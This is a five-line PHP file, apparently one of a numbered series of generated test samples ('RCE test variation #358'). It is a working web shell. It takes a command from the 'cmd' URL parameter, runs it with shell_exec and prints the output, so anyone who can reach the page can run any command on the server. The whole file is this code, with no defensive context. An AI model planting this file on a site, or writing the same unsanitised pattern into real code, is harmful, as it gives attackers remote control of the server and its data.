<?php
// RCE test variation #358
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>